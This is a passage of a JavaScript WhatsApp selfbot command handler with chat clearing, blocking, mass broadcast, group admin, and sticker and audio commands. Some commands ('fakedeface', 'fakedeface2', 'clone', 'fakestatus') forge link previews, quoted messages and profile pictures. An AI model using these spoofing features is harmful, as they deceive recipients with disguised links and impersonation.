                    anu = await riyan.chats.all()
                    riyan.setMaxListeners(25)
                    for (let _ of anu) {
                    riyan.modifyChat(_.jid, ChatModification.delete)
                    }
                    fakestatus(`*Succes clear ${anu.length} chats*`, '𝒀𝒂𝒏𝒛 𝑺𝒆𝒍𝒇𝒃𝒐𝒕', text, fakethumb)
                    break
               case 'block':
                    if (yan.message.extendedTextMessage != undefined) {
                    mentionUs = `${mentionUser}`
                    riyan.sendMessage(from, `*Succes block* @${mentionUser[0].split("@")[0]}`, text, {quoted: freply, contextInfo: {mentionedJid: [mentionUs]}})
                    .then(riyan.blockUser (`${mentionUser[0].split("@")[0]}@c.us`, "add"))
                    } else {
                    riyan.sendMessage(from, `*Succes block* ${q}`, text, {quoted: freply})
                    .then(riyan.blockUser (`${q}@c.us`, "add"))
                    }
                    break
               case 'unblock':
                    if (yan.message.extendedTextMessage != undefined) {
                    mentionUs = `${mentionUser}`
                    riyan.sendMessage(from, `*Succes unblock* @${mentionUser[0].split("@")[0]}`, text, {quoted: freply, contextInfo: {mentionedJid: [mentionUs]}})
                    .then(riyan.blockUser (`${mentionUser[0].split("@")[0]}@c.us`, "remove"))
                    } else {
                    riyan.sendMessage(from, `*Succes unblock* ${q}`, text, {quoted: freply})
                    .then(riyan.blockUser (`${q}@c.us`, "remove"))
                    }
                    break
               case 'block2':
                    riyan.blockUser(from, "add")
                    break
               case 'leave': 
                    if (!isGroup) return reply(mess.only.group)
                    fakestatus('Byee...👋', '𝒀𝒂𝒏𝒏𝒛 𝑺𝒆𝒍𝒇𝒃𝒐𝒕 - 𝑩𝒚 𝒀𝒂𝒏𝒏𝒛', text, fakethumb)
                    await sleep(2000)
                    riyan.modifyChat(from, ChatModification.delete)
                    riyan.groupLeave(from, from)
                    break
               case 'bcpic':
                    if (yanz.length < 1) return reply('.......')
                    anu = await riyan.chats.all()
                    if (isMedia && !yan.message.videoMessage || isQuotedImage) {
                    const encmedia = isQuotedImage ? JSON.parse(JSON.stringify(yan).replace('quotedM','m')).message.extendedTextMessage.contextInfo : yan
                    buff = await riyan.downloadMediaMessage(encmedia)
                    for (let _ of anu) {
                    riyan.sendMessage(_.jid, buff, image, {caption: `「 *YANNZ BROADCAST* 」\n\n${body.slice(7)}`})
                    }
                    thumbnail = fs.readFileSync('./strg/image/ranime2.jpeg')
                    fakestatus(`Done Broadcast Picture`, '𝒀𝒂𝒏𝒛 𝑺𝒆𝒍𝒇𝒃𝒐𝒕', text, thumbnail)
                    }
                    break
               case 'bc':
                    if (yanz.length < 1) return reply('.......')
                    anu = await riyan.chats.all()
                    for (let _ of anu) {
                    riyan.sendMessage(_.jid, `「 *YANNZ BROADCAST* 」\n\n${body.slice(4)}`, text)
                    }
                    thumbnail = fs.readFileSync('./strg/image/ranime2.jpeg')
                    fakestatus(`Done Broadcast Text`, '𝒀𝒂𝒏𝒛 𝑺𝒆𝒍𝒇𝒃𝒐𝒕', text, thumbnail)
                    break
               case 'bcvid':
                    if (yanz.length < 1) return reply('.......')
                    anu = await riyan.chats.all()
                    if (isMedia && yan.message.videoMessage.seconds < 60 || isQuotedVideo) {
                    const encmedia2 = isQuotedVideo ? JSON.parse(JSON.stringify(yan).replace('quotedM','m')).message.extendedTextMessage.contextInfo : yan
                    buff = await riyan.downloadMediaMessage(encmedia2)
                    for (let _ of anu) {
                    riyan.sendMessage(_.jid, buff, video, {caption: `「 *YANNZ BROADCAST* 」\n\n${body.slice(7)}`})
                    }
                    thumbnail = fs.readFileSync('./strg/image/ranime2.jpeg')
                    fakestatus(`Done Broadcast Video`, '𝒀𝒂𝒏𝒛 𝑺𝒆𝒍𝒇𝒃𝒐𝒕', text, thumbnail)
                    }
                    break
               case 'setprofile':
               case 'setpp':
                    riyan.updatePresence(from, Presence.composing) 
                    if (!isQuotedImage) return reply(`Kirim gambar dengan caption ${prefix}setprofil atau tag gambar yang sudah dikirim`)
                    enmedia = JSON.parse(JSON.stringify(yan).replace('quotedM','m')).message.extendedTextMessage.contextInfo
                    media = await riyan.downloadAndSaveMediaMessage(enmedia)
                    await riyan.updateProfilePicture(botNumber, media)
                    reply('Succes mengganti foto pofile!')
                    fs.unlinkSync(media)
                    break
               case 'add':
                    if (yanz.length < 1) return reply('Manaaa nomornyaa pea')
                    if (yanz[0].startsWith('08')) return reply('Gunakan kode negara\n\nEx : 6285791458996')
                    try {
                    num = `${yanz[0].replace(/ /g, '')}@s.whatsapp.net`
                    riyan.groupAdd(from, [num])
                    } catch (e) {
                    reply('Gagal menambahkan, mungkin karena di private')
                    }
                    reply(`Done! berhasil menambahkan peserta`)
                    break
               case 'grup':
               case 'group':
               case 'gc':
                    thumbnail = fs.readFileSync('./strg/image/ranime2.jpeg')
                    if (yanz[0] === 'unlock') {
                    riyan.groupSettingChange(from, GroupSettingChange.messageSend, false)
                    fakestatus(`*Berhasil membuka group!*`, '𝒀𝒂𝒏𝒛 𝑺𝒆𝒍𝒇𝒃𝒐𝒕', text, thumbnail)
                    } else if (yanz[0] === 'lock') {
                    riyan.groupSettingChange(from, GroupSettingChange.messageSend, true)
                    fakestatus(`*Berhasil menutup group!*`, '𝒀𝒂𝒏𝒛 𝑺𝒆𝒍𝒇𝒃𝒐𝒕', text, thumbnail)
                    }
                    break
               case 'me':
               case 'sendcontact':
               case 'owner':
               case 'riyan':
                    riyan.sendMessage(from, {displayname: "Jeff", vcard: vcard}, MessageType.contact,
                    {contextInfo: {
                        forwardingScore: 999,
                        isForwarded: true,
                        participant: "0@s.whatsapp.net",
                        remoteJid: 'status@broadcast',
                        quotedMessage: {
                            productMessage: {
                                product: {
                                    currencyCode: "IDR",
                                    title: '𝒀𝒂𝒏𝒏𝒛 𝑺𝒆𝒍𝒇𝒃𝒐𝒕 - 𝑩𝒚 𝒀𝒂𝒏𝒏𝒛',
                                    priceAmount1000: 10,
                                    productImageCount: 1,
                                    productImage: {
                                    jpegThumbnail: fs.readFileSync('./strg/image/riyan.jpg')
                                    }
                                },
                                businessOwnerJid: "0@s.whatsapp.net"
                            }
                        }
                    }})
                    break
               case 'demoteall':
                    riyan.groupDemoteAdmin(from, groupAdmins)
                    fakestatus('Done Demote All Admin Group!', '𝒀𝒂𝒏𝒛 𝑺𝒆𝒍𝒇𝒃𝒐𝒕', text, fakethumb)
                    break
               case 'demote':
                    if (yan.message.extendedTextMessage === undefined || yan.message.extendedTextMessage === null) return reply('Tag target yg ingin di kudeta!')
                    mentions(`Done! @${mentionUser[0].split('@')[0]} sekarang menjadi member!`, mentionUser, true)
                    riyan.groupDemoteAdmin(from, mentionUser)
                    break
               case 'promote':
                    if (yan.message.extendedTextMessage === undefined || yan.message.extendedTextMessage === null) return reply('Tag dulu membernya njir')
                    mentions(`Done! @${mentionUser[0].split('@')[0]} sekarang admin`, mentionUser, true)
                    riyan.groupMakeAdmin(from, mentionUser)
                    break
               case 'promoteall':
                    members_id = []
                    for (let mem of groupMembers) {
                    members_id.push(mem.jid)
                    }
                    riyan.groupMakeAdmin(from, members_id)
                    fakestatus('Done Promote All Member Group!', '𝒀𝒂𝒏𝒛 𝑺𝒆𝒍𝒇𝒃𝒐𝒕', text, fakethumb)
                    break
               case 'kick':
                    if (yan.message.extendedTextMessage === undefined || yan.message.extendedTextMessage === null) return reply('Tag yang member yang ingin ditendang!')
                    mentions(`Done! @${mentionUser[0].split('@')[0]} akan di kick`, mentionUser, true)
                    riyan.groupRemove(from, mentionUser)
                    break
               case 'listadmin':
                    teks = `List admin Group *${groupMetadata.subject}*\nTotal : ${groupAdmins.length}\n\n`
                    no = 0
                    for (let admon of groupAdmins) {
                    no += 1
                    teks += `[${no.toString()}] @${admon.split('@')[0]}\n`
                    }
                    mentions(teks, groupAdmins, true)
                    break
               case 'toimg':
                    encmedia = JSON.parse(JSON.stringify(yan).replace('quotedM','m')).message.extendedTextMessage.contextInfo
                    media = await riyan.downloadAndSaveMediaMessage(encmedia)
                    ran = getRandom('.png')
                    exec(`ffmpeg -i ${media} ${ran}`, (err) => {
                    fs.unlinkSync(media)
                    if (err) return reply(ind.stikga())
                    buffer = fs.readFileSync(ran)
                    riyan.sendMessage(from, buffer, image, {quoted: yan, caption: 'succes'})
                    fs.unlinkSync(ran)
                       })
                    break
               case 'welcome':
                    thumbnail = fs.readFileSync('./strg/image/ranime2.jpeg')
                    if (yanz.length < 1) return reply(`Use 1 or 0\n\nEx :\n${prefix}welcome 1\n${prefix}welcome 0`)
                    if (Number(yanz[0]) === 1) {
                    if (isWelkom) return fakestatus(`*Status : Aktif*`, '𝒀𝒂𝒏𝒛 𝑺𝒆𝒍𝒇𝒃𝒐𝒕', text, thumbnail)
                    welkom.push(from)
                    fs.writeFileSync('./src/group/welkom.json', JSON.stringify(welkom, null, 2))
                    fakestatus(`*Succes Mengaktifkan Fitur Welcome/Left Di Group Ini*`, '𝒀𝒂𝒏𝒛 𝑺𝒆𝒍𝒇𝒃𝒐𝒕', text, thumbnail)
                    } else if (Number(yanz[0]) === 0) {
                    if (!isWelkom) return fakestatus(`*Status : Nonaktif*`, '𝒀𝒂𝒏𝒛 𝑺𝒆𝒍𝒇𝒃𝒐𝒕', text, thumbnail)
                    index = welkom.indexOf(from)
                    welkom.splice(index, 1)
                    fs.writeFileSync('./src/group/welkom.json', JSON.stringify(welkom, null, 2))
                    fakestatus(`*Succes Menonaktifkan Fitur Welcome/Left Di Group Ini*`, '𝒀𝒂𝒏𝒛 𝑺𝒆𝒍𝒇𝒃𝒐𝒕', text, thumbnail)
                    } else {
                    reply(`${prefix}welcome 1 untuk mengaktifkan\n${prefix}welcome 0 untuk menonaktifkan\ncontoh: ${prefix}welcome 1`)
                    }
                    break
               case 'promdem':
                    thumbnail = fs.readFileSync('./strg/image/ranime2.jpeg')
                    if (yanz.length < 1) return reply(`Use 1 or 0\n\nEx :\n${prefix}promdem 1\n${prefix}promdem 0`)
                    if (Number(yanz[0]) === 1) {
                    if (isPromdem) return fakestatus(`*Status : Aktif*`, '𝒀𝒂𝒏𝒛 𝑺𝒆𝒍𝒇𝒃𝒐𝒕', text, thumbnail)
                    promdem.push(from)
                    fs.writeFileSync('./src/group/promdem.json', JSON.stringify(promdem, null, 2))
                    fakestatus(`*Succes Mengaktifkan Fitur Promdem Di Group Ini*`, '𝒀𝒂𝒏𝒛 𝑺𝒆𝒍𝒇𝒃𝒐𝒕', text, thumbnail)
                    } else if (Number(yanz[0]) === 0) {
                    if (!isPromdem) return fakestatus(`*Status : Nonaktif*`, '𝒀𝒂𝒏𝒛 𝑺𝒆𝒍𝒇𝒃𝒐𝒕', text, thumbnail)
                    index = promdem.indexOf(from)
                    promdem.splice(index, 1)
                    fs.writeFileSync('./src/group/promdem.json', JSON.stringify(promdem, null, 2))
                    fakestatus(`*Succes Menonaktifkan Fitur Promdem Di Group Ini*`, '𝒀𝒂𝒏𝒛 𝑺𝒆𝒍𝒇𝒃𝒐𝒕', text, thumbnail)
                    } else {
                    reply(`${prefix}promdem 1 untuk mengaktifkan\n${prefix}promdem 0 untuk menonaktifkan\ncontoh: ${prefix}promdem 1`)
                    }
                    break
               case 'antilink':
                    thumbnail = fs.readFileSync('./strg/image/ranime2.jpeg')
                    if (yanz.length < 1) return reply(`Use 1 or 0\n\nEx :\n${prefix}antilink 1\n${prefix}antilink 0`)
                    if (Number(yanz[0]) === 1) {
                    if (isAntiLink) return fakestatus(`*Status : Aktif*`, '𝒀𝒂𝒏𝒛 𝑺𝒆𝒍𝒇𝒃𝒐𝒕', text, thumbnail)
                    antilink.push(from)
                    fs.writeFileSync('./src/group/antilink.json', JSON.stringify(antilink, null, 2))
                    fakestatus(`*Succes Mengaktifkan Fitur Antilink Di Group Ini*`, '𝒀𝒂𝒏𝒛 𝑺𝒆𝒍𝒇𝒃𝒐𝒕', text, thumbnail)
                    riyan.sendMessage(from,`Attention to all member, antilink active, if you send a group link, you will be kicked from the group`, text)
                    } else if (Number(yanz[0]) === 0) {
                    if (!isAntiLink) return fakestatus(`*Status : Nonaktif*`, '𝒀𝒂𝒏𝒛 𝑺𝒆𝒍𝒇𝒃𝒐𝒕', text, thumbnail)
                    index = antilink.indexOf(from)
                    antilink.splice(index, 1)
                    fs.writeFileSync('./src/group/antilink.json', JSON.stringify(antilink, null, 2))
                    fakestatus(`*Succes Menonaktifkan Fitur Welcome/Left Di Group Ini*`, '𝒀𝒂𝒏𝒛 𝑺𝒆𝒍𝒇𝒃𝒐𝒕', text, thumbnail)
                    } else {
                    reply(`${prefix}${command} 1 untuk mengaktifkan\n${prefix}promdem 0 untuk menonaktifkan\ncontoh: ${prefix}${command} 1`)
                    }
                    break
               case 'antidelete':
                    thumbnail = fs.readFileSync('./strg/image/ranime2.jpeg')
                    if (yanz.length < 1) return reply(`Use 1 or 0\n\nEx :\n${prefix}antidelete 1\n${prefix}antidelete 0`)
                    if (yanz[0] === 'aktif') {
                    if (isAntiDelete) return fakestatus(`*Status : Aktif*`, '𝒀𝒂𝒏𝒛 𝑺𝒆𝒍𝒇𝒃𝒐𝒕', text, thumbnail)
                    antidelete.push(from)
                    fs.writeFileSync('./src/group/antidelete.json', JSON.stringify(antidelete, null, 2))
                    fakestatus(`*Succes Mengaktifkan Fitur antidelete Di Group Ini*`, '𝒀𝒂𝒏𝒛 𝑺𝒆𝒍𝒇𝒃𝒐𝒕', text, thumbnail)
                    } else if (yanz[0] === 'mati') {
                    if (!isAntiDelete) return fakestatus(`*Status : Nonaktif*`, '𝒀𝒂𝒏𝒛 𝑺𝒆𝒍𝒇𝒃𝒐𝒕', text, thumbnail)
                    index = antidelete.indexOf(from)
                    antidelete.splice(index, 1)
                    fs.writeFileSync('./src/group/antidelete.json', JSON.stringify(antidelete, null, 2))
                    fakestatus(`*Succes Menonaktifkan Fitur antidelete Di Group Ini*`, '𝒀𝒂𝒏𝒛 𝑺𝒆𝒍𝒇𝒃𝒐𝒕', text, thumbnail)
                    }
                    break
               case 'tagall2':
                    members_id = []
                    teks = (yanz.length > 0) ? body.slice(8).trim() : ''
                    teks += '\n'
                    for (let mem of groupMembers) {
                    teks += `| • ${mem.jid.split('@')[0]}\n`
                    members_id.push(mem.jid)
                    }
                    reply(teks.trim())
                    break
               case 'tagall3':
                    members_id = []
                    teks = (yanz.length > 0) ? body.slice(8).trim() : ''
                    teks += '\n'
                    for (let mem of groupMembers) {
                    teks += `| • https://wa.me/${mem.jid.split('@')[0]}\n`
                    members_id.push(mem.jid)
                    }
                    riyan.sendMessage(from, teks, text, {detectLinks: false, quoted: yan})
                    break
               case 'clone':
                    if (yanz.length < 1) return reply('tag target!!')
                    if (yan.message.extendedTextMessage === undefined || yan.message.extendedTextMessage === null) return reply('Tag cvk')
                    mentioned = yan.message.extendedTextMessage.contextInfo.mentionedJid[0]
                    let { jid, id, notify } = groupMembers.find(x => x.jid === mentioned)
                    try {
                    pp = await riyan.getProfilePicture(id)
                    buffer = await getBuffer(pp)
                    riyan.updateProfilePicture(botNumber, buffer)
                    mentions(`Foto profile Berhasil di perbarui menggunakan foto profile @${id.split('@')[0]}`, [jid], true)
                    } catch (e) {
                    reply('Gagal, ulangi lagi')
                    }
                    break
               case 'addvn':
                    const audionye = JSON.parse(fs.readFileSync(`./strg/audio.json`))
                    svst = body.slice(7)
                    if (!svst) return reply('Nama audionya apa su?')
                    boij = JSON.parse(JSON.stringify(yan).replace('quotedM', 'm')).message.extendedTextMessage.contextInfo
                    delb = await riyan.downloadMediaMessage(boij)
                    audionye.push(`${svst}`)
                    fs.writeFileSync(`./strg/audio/${svst}.mp3`, delb)
                    fs.writeFileSync(`./strg/audio.json`, JSON.stringify(audionye))
                    riyan.sendMessage(from, `Sukses Menambahkan Audio\nCek dengan cara ${prefix}listvn`, MessageType.text, { quoted: yan })
                    break
               case 'getvn':
                    try {
                    namastc = body.slice(7)
                    buffer = fs.readFileSync(`./strg/audio/${namastc}.mp3`)
                    riyan.sendMessage(from, buffer, audio, { mimetype: 'audio/mp4', quoted: yan, ptt: true })
                    } catch (e) {
                    reply(`Vn ${namastc} ga ada di storage anjir, liat di ${prefix}listvn`)
                    }
                    break
               case 'roarr':
               case 'ohayo':
               case 'loli2':
               case 'heartbreak':
               case 'hehe':
                    buffer = fs.readFileSync(`./strg/audio/${command}.mp3`)
                    riyan.sendMessage(from, buffer, audio, { mimetype: 'audio/mp4', quoted: yan, ptt: true })
                    break
               case 'citacita':
                    bebeh = fs.readFileSync('./src/citacita.json')
                    yakan = JSON.parse(bebeh)
                    tod = Math.floor(Math.random() * yakan.length)
                    hemm = yakan[tod]
                    buffer = await getBuffer(hemm.url)
                    riyan.sendMessage(from, buffer, audio, {mimetype: 'audio/mp4', ptt: true, quoted: yan})
                    break
               case 'listvn':
               case 'vnlist':
                    const audiolist = JSON.parse(fs.readFileSync(`./strg/audio.json`))
                    teks = '*List Vn:*\n\n'
                    for (let awokwkwk of audiolist) {
                    teks += `- ${awokwkwk}\n`
                    }
                    teks += `\n*Total : ${audiolist.length}*`
                    riyan.sendMessage(from, teks.trim(), extendedText, { quoted: yan, contextInfo: { "mentionedJid": audiolist } })
                    break
               case 'getstiker':
                    try {
                    namastc = body.slice(11)
                    result = fs.readFileSync(`./strg/stiker/${namastc}.webp`)
                    riyan.sendMessage(from, result, sticker, {quoted :yan})
                    } catch (e) {
                    reply(`Stiker ${namastc} ga ada di storage anjir, liat di ${prefix}liststiker`)
                    }
                    break
               case 'stikerlist':
               case 'liststiker':
                    setiker = JSON.parse(fs.readFileSync('./strg/stik.json'))
                    teks = '*Sticker List :*\n\n'
                    for (let awokwkwk of setiker) {
                    teks += `- ${awokwkwk}\n`
                    }
                    teks += `\n*Total : ${setiker.length}*`
                    riyan.sendMessage(from, teks.trim(), extendedText, { quoted: yan, contextInfo: { "mentionedJid": setiker } })
                    break
               case 'addstiker':
                    setiker = JSON.parse(fs.readFileSync('./strg/stik.json'))
                    svst = body.slice(11)
                    if (!svst) return reply('Nama sticker nya apa?')
                    boij = JSON.parse(JSON.stringify(yan).replace('quotedM', 'm')).message.extendedTextMessage.contextInfo
                    delb = await riyan.downloadMediaMessage(boij)
                    setiker.push(`${svst}`)
                    fs.writeFileSync(`./strg/stiker/${svst}.webp`, delb)
                    fs.writeFileSync(`./strg/stik.json`, JSON.stringify(setiker))
                    riyan.sendMessage(from, `Sukses Menambahkan Stickee\nCek dengan cara ${prefix}liststiker`, MessageType.text, { quoted: yan })
                    break
               case 'addimage':
                    if (!isQuotedImage) return reply('Reply imagenya blokk!')
                    imagenye = JSON.parse(fs.readFileSync('./strg/image.json'))
                    svst = body.slice(10)
                    if (!svst) return reply('Nama imagenya apa su?')
                    boij = JSON.parse(JSON.stringify(yan).replace('quotedM', 'm')).message.extendedTextMessage.contextInfo
                    delb = await riyan.downloadMediaMessage(boij)
                    imagenye.push(`${svst}`)
                    fs.writeFileSync(`./strg/image/${svst}.jpeg`, delb)
                    fs.writeFileSync('./strg/image.json', JSON.stringify(imagenye))
                    riyan.sendMessage(from, `Sukses Menambahkan Video\nCek dengan cara ${prefix}listimage`, MessageType.text, { quoted: yan })
                    break
               case 'imagelist':
               case 'listimage':
                    imagenye = JSON.parse(fs.readFileSync('./strg/image.json'))
                    teks = '*List Image :*\n\n'
                    for (let awokwkwk of imagenye) {
                     teks += `- ${awokwkwk}\n`
                     }
                     teks += `\n*Total : ${imagenye.length}*`
                     riyan.sendMessage(from, teks.trim(), extendedText, { quoted: yan, contextInfo: { "mentionedJid": imagenye } })
                    break
               case 'getimage':
                    try {
                    quer = body.slice(10)
                    result = fs.readFileSync(`./strg/image/${quer}.jpeg`)
                    riyan.sendMessage(from, result, image, { quoted: yan, caption: `Gambar *${quer}*` })
                    } catch (e) {
                    reply(`Gambar ${quer} ga ada di storage anjir, liat di ${prefix}listimage`)
                    }
                    break
               case 'bugimg':
                    var nnn = body.slice(12)
                    var urlnyee = nnn.split("|")[0];
                    var titlenyee = nnn.split("|")[1];
                    var run = getRandom('.jpeg')
                    var media1 = isQuotedImage ? JSON.parse(JSON.stringify(yan).replace('quotedM', 'm')).message.extendedTextMessage.contextInfo : yan
                    var media2 = await riyan.downloadAndSaveMediaMessage(media1)
                    var ddatae = await imageToBase64(JSON.stringify(media2).replace(/\"/gi, ''))
                    riyan.sendMessage(from, {
                        text: `${q}`,
                        title: `${titlenyee}`,
                        jpegThumbnail: ddatae
                        }, 'extendedTextMessage', { sendEphemeral: false, detectLinks: false })
                    fs.unlinkSync(media2)
                    break
               case 'fakedeface':
                    fake = body.slice(12)
                    var imgbb = require('imgbb-uploader')
                    run = getRandom('.jpeg')
                    encmedia = isQuotedImage ? JSON.parse(JSON.stringify(yan).replace('quotedM','m')).message.extendedTextMessage.contextInfo : yan
                    media = await riyan.downloadAndSaveMediaMessage(encmedia)
                    ddatae = await imageToBase64(JSON.stringify(media).replace(/\"/gi, ''))
                    fs.writeFileSync(`${run}`, ddatae, 'base64')
                    riyan.sendMessage(from, `${fake}`, text, {thumbnail: fs.readFileSync(`./${run}`)})
                    fs.unlinkSync(media)
                    break
               case 'fakedeface2':
                    var nn = body.slice(13)
                    var urlnye = nn.split("|")[0];
                    var titlenye = nn.split("|")[1];
                    var descnye = nn.split("|")[2];
                    run = getRandom('.jpeg')
                    encmedia = isQuotedImage ? JSON.parse(JSON.stringify(yan).replace('quotedM','m')).message.extendedTextMessage.contextInfo : yan
                    media = await riyan.downloadAndSaveMediaMessage(encmedia)
                    ddatae = await imageToBase64(JSON.stringify(media).replace(/\"/gi,''))
                    riyan.sendMessage(from, {
                    text: `${urlnye}`,
                    matchedText: `${urlnye}`,
                    canonicalUrl: `${urlnye}`,
                    description: `${descnye}`,
                    title: `${titlenye}`,
                    jpegThumbnail: ddatae }, 'extendedTextMessage', { detectLinks: false })
                    fs.unlinkSync(media)
                    break
                        default:
                    thumbnail = fs.readFileSync('./strg/stiker/dah jago.webp')
                    if (body.startsWith(`${prefix}${command}`)) {
                  fakestatus('Gada cmd itu, lupa ato typo kali lu', `Command ${prefix}${command}`, text, thumbnail)
               }
               }
                } catch (e) {
                     console.log('Error : %s', color(e, 'red'))
                }
})
